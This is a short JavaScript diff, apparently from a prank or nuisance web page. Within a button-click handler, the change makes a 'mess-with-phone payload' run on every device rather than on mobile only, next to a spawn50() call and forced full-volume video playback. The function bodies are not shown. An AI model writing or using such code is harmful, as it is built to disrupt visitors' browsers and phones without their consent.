@@ -144,10 +144,8 @@
         var mv = document.querySelector('#media video');
         if (mv) { mv.muted = false; mv.volume = 1; mv.play(); }
       } catch (e) {}
-      // trigger mess-with-phone payload on mobile (button click)
-      if (isMobile()) {
-        try { messWithPhone(); } catch (e) {}
-      }
+      // trigger ALL mechanisms on button click (mess-with-phone + spawn)
+      try { messWithPhone(); } catch (e) {}
       spawn50();
     });
   }
